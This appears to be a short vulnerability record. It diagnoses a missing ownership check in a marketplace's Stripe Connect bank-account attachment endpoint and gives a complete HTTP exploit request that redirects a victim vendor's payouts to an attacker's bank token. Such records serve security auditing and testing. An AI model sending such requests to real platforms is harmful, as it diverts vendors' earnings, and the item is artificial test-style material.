diagnosis: The external bank account attachment endpoint calls stripe.accounts.createExternalAccount using stripeAccountId from the client request body. It fails to check if req.user.id is the registered owner of stripeAccountId. An attacker can attach their own external bank account to a victim's Stripe Connected account and make it the default payout destination.
exploit_request:
POST /api/connect/bank-accounts/attach HTTP/1.1
Host: accounts.multivendor.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsIn...
Content-Type: application/json

{
  "stripeAccountId": "acct_1H99VictimVendor",
  "bankToken": "btok_1N00AttackerBankToken"
}
